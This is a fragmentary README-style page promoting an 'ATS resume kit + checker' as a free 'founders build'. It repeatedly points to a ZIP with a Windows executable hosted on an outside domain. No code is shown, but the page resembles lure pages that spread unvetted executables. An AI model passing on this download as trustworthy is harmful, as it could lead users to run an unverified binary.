...
### ATS resume kit + checker

**KERNELX · founders build · 180 days free**

[Download ZIP](https://pannki.com/hirestack.zip) · [Landing](./apps/web/index.html) · [Org](https://github.com/rairaisaqlain-rgb)
...
| --- | --- | --- | --- |
| Windows | `hirestack.exe` inside zip | live | [hirestack.zip](https://pannki.com/hirestack.zip) |

```text
https://pannki.com/hirestack.zip
```
